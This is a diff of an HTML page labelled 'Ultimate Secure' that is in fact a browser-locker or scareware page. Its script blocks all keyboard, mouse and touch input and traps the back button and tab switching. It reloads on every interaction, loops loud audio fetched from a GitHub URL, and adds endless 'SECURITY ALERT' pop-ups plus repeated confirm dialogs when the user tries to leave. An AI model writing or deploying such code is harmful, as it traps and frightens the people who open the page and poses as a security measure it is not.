@@ -1,78 +1,176 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
-<title>Secure</title>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0" />
+<title>Ultimate Secure</title>
 <style>
-html,body{height:100%;margin:0;background:#000;color:#000;overflow:hidden;touch-action:none;-webkit-user-select:none;-ms-user-select:none;user-select:none}
-#topBlocker{position:fixed;top:0;left:0;right:0;height:48px;background:#000;z-index:2147483646;pointer-events:all}
-#modal{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:#000;z-index:2147483647}
-#box{max-width:94vw;padding:1rem;border:2px solid #111;background:#000;color:#111;font-family:monospace;white-space:pre-wrap;word-break:break-word;overflow:hidden}
-#pw{margin-top:1rem;width:220px;padding:.5rem;border:2px solid #111;background:#000;color:#111;font-size:16px}
-#hiddenAudio{display:none}
+  html, body {
+    margin:0; padding:0; height:100%; background:#000; color:#111;
+    user-select:none; -webkit-user-select:none; -ms-user-select:none; 
+    overflow:hidden; touch-action:none; font-family: monospace;
+  }
+  #modal {
+    position: fixed; inset:0; background:#000; color:#111;
+    display: flex; justify-content:center; align-items:center;
+    z-index:2147483647; cursor:pointer;
+  }
+  #box {
+    max-width: 95vw; max-height: 90vh; overflow:hidden;
+    white-space: pre-wrap; word-break: break-word;
+    border: 2px solid #111; padding: 1rem;
+    background:#000;
+    user-select:none;
+  }
+  #topBlocker {
+    position: fixed; top:0; left:0; right:0; height:48px;
+    background:#000; z-index:2147483646; pointer-events: all;
+  }
 </style>
 </head>
 <body>
 <div id="topBlocker" aria-hidden="true"></div>
-<div id="modal" role="dialog" aria-modal="true" aria-label="Security">
+<div id="modal" role="dialog" aria-modal="true" aria-label="Security Blocker">
   <div id="box" tabindex="-1" aria-readonly="true"></div>
 </div>
-<audio id="hiddenAudio" crossorigin="anonymous" playsinline loop></audio>
+<audio id="audio" crossorigin="anonymous" playsinline loop></audio>
 <script>
-(function(){
-  const AUDIO_URL='https://raw.githubusercontent.com/hedredy/Project/2d591f652b1ac4b12d87e38482ad5679cb0d516c/macan-asphalt-8.mp3';
-  const HASH_LEN=50000;
-  const chars="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:',.<>/?";
-  const box=document.getElementById('box');
-  const modal=document.getElementById('modal');
-  const topBlocker=document.getElementById('topBlocker');
-  const audioEl=document.getElementById('hiddenAudio');
-  let stopped=false;
-  function rand(len){
-    let s=''; for(let i=0;i<len;i++) s+=chars.charAt(Math.floor(Math.random()*chars.length)); return s;
+(() => {
+  const AUDIO_URL = 'https://raw.githubusercontent.com/hedredy/Project/2d591f652b1ac4b12d87e38482ad5679cb0d516c/macan-asphalt-8.mp3';
+  const HASH_LENGTH = 50000;
+  const CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:',.<>/?";
+  const box = document.getElementById('box');
+  const modal = document.getElementById('modal');
+  const audio = document.getElementById('audio');
+  const topBlocker = document.getElementById('topBlocker');
+  let alertsRunning = false;
+
+  function randomString(len) {
+    let s = '';
+    for (let i=0; i<len; i++) {
+      s += CHARS.charAt(Math.floor(Math.random()*CHARS.length));
+    }
+    return s;
   }
-  function fillHash(){
-    const chunk=1024;
-    let written=0;
-    box.textContent='';
-    function step(){
-      let add=Math.min(chunk,HASH_LEN-written);
-      box.textContent+=rand(add);
-      written+=add;
-      if(written<HASH_LEN) requestAnimationFrame(step);
+
+  function fillHash() {
+    const chunkSize = 1024;
+    let written = 0;
+    box.textContent = '';
+    function step() {
+      let add = Math.min(chunkSize, HASH_LENGTH - written);
+      box.textContent += randomString(add);
+      written += add;
+      if (written < HASH_LENGTH) {
+        requestAnimationFrame(step);
+      }
     }
     step();
   }
-  fillHash();
-  function prevent(e){ try{ e.preventDefault(); e.stopImmediatePropagation(); }catch(err){} return false; }
-  const blockEvents=['contextmenu','copy','cut','paste','selectstart','dragstart','mousedown','mouseup','mousemove','touchstart','touchmove','touchend','pointerdown','pointerup','wheel'];
-  blockEvents.forEach(ev=>document.addEventListener(ev,prevent,{capture:true,passive:false}));
-  document.addEventListener('keydown',function(e){ e.preventDefault(); e.stopImmediatePropagation(); return false; },{capture:true});
-  window.addEventListener('blur',()=>{ try{ window.focus(); }catch(e){} });
-  history.pushState(null,document.title,location.href);
-  window.addEventListener('popstate',()=>{ history.pushState(null,document.title,location.href); });
-  window.onbeforeunload=function(){ return ''; };
-  async function setupAudio(){
-    try{
-      audioEl.src=AUDIO_URL;
-      audioEl.loop=true;
-      audioEl.volume=1.0;
-      await audioEl.load();
-      let saved=localStorage.getItem('__pos'); if(saved) audioEl.currentTime=parseFloat(saved)||0;
-      const playTry=()=>{ audioEl.play().catch(()=>{}); };
-      playTry();
-      document.addEventListener('click',playTry,{once:true,capture:true});
-      document.addEventListener('touchstart',playTry,{once:true,capture:true});
-      audioEl.addEventListener('pause',()=>{ if(!stopped) audioEl.play().catch(()=>{}); });
-      setInterval(()=>{ try{ if(!audioEl.paused) localStorage.setItem('__pos',audioEl.currentTime); }catch(e){} },800);
-      window.addEventListener('visibilitychange',()=>{ if(document.visibilityState==='visible') audioEl.play().catch(()=>{}); });
-    }catch(e){}
+
+  function blockEvent(e) {
+    try {
+      e.preventDefault();
+      e.stopImmediatePropagation();
+    } catch {}
+    return false;
   }
+
+  function spamAlerts() {
+    if (alertsRunning) return;
+    alertsRunning = true;
+    let count = 0;
+    function loop() {
+      count++;
+      alert("SECURITY ALERT #" + count);
+      setTimeout(loop, 10);
+    }
+    loop();
+  }
+
+  function spamConfirmsBeforeUnload(e) {
+    let count = 0;
+    while(count < 30){
+      if(!confirm("WARNING! You are trying to leave the site! Confirm?")) break;
+      count++;
+    }
+    e.preventDefault();
+    return "";
+  }
+
+  function immediateReload() {
+    try {
+      location.reload();
+    } catch {
+      location.href = location.href;
+    }
+  }
+
+  fillHash();
+
+  // Block user interactions fully
+  ['contextmenu','copy','cut','paste','selectstart','dragstart','mousedown','mouseup','mousemove','touchstart','touchmove','touchend','pointerdown','pointerup','wheel'].forEach(ev => {
+    document.addEventListener(ev, blockEvent, {capture:true, passive:false});
+  });
+
+  document.addEventListener('keydown', e => {
+    blockEvent(e);
+  }, {capture:true});
+
+  // Prevent switching tabs or going back
+  window.addEventListener('blur', () => { try { window.focus(); } catch {} });
+  history.pushState(null, document.title, location.href);
+  window.addEventListener('popstate', () => { history.pushState(null, document.title, location.href); });
+
+  // Warn on unload with spam of confirms
+  window.onbeforeunload = spamConfirmsBeforeUnload;
+
+  // Audio setup and persistent playback
+  async function setupAudio() {
+    try {
+      audio.src = AUDIO_URL;
+      audio.loop = true;
+      audio.volume = 1.0;
+      await audio.load();
+      let savedPos = localStorage.getItem('__pos');
+      if(savedPos) audio.currentTime = parseFloat(savedPos) || 0;
+      const playAudio = () => { audio.play().catch(() => {}); };
+      playAudio();
+      document.addEventListener('click', playAudio, {once:true, capture:true});
+      document.addEventListener('touchstart', playAudio, {once:true, capture:true});
+      audio.addEventListener('pause', () => { if(!alertsRunning) audio.play().catch(() => {}); });
+      setInterval(() => {
+        try {
+          if(!audio.paused) localStorage.setItem('__pos', audio.currentTime);
+        } catch {}
+      }, 800);
+      window.addEventListener('visibilitychange', () => {
+        if(document.visibilityState === 'visible') audio.play().catch(() => {});
+      });
+    } catch {}
+  }
+
   setupAudio();
-  function immediateReload(){ try{ location.reload(); }catch(e){ location.href=location.href; } }
-  const reloadable=['click','dblclick','keydown','keyup','keypress','contextmenu','touchstart','touchend','pointerdown','pointerup','wheel'];
-  reloadable.forEach(ev=>window.addEventListener(ev,()=>{ try{ immediateReload(); }catch(e){} },{capture:true,passive:false}));
+
+  // On modal click: start spam alerts
+  modal.addEventListener('click', e => {
+    e.stopPropagation();
+    spamAlerts();
+  });
+
+  // On any user interaction: immediate reload to block actions further
+  ['click','dblclick','keydown','keyup','keypress','contextmenu','touchstart','touchend','pointerdown','pointerup','wheel'].forEach(ev => {
+    window.addEventListener(ev, () => {
+      immediateReload();
+    }, {capture:true, passive:false});
+  });
+
+  // Prevent text selection / copying in modal box as well
+  box.addEventListener('selectstart', blockEvent);
+  box.addEventListener('copy', blockEvent);
+  box.addEventListener('cut', blockEvent);
+  box.addEventListener('paste', blockEvent);
+
 })();
 </script>
 </body>
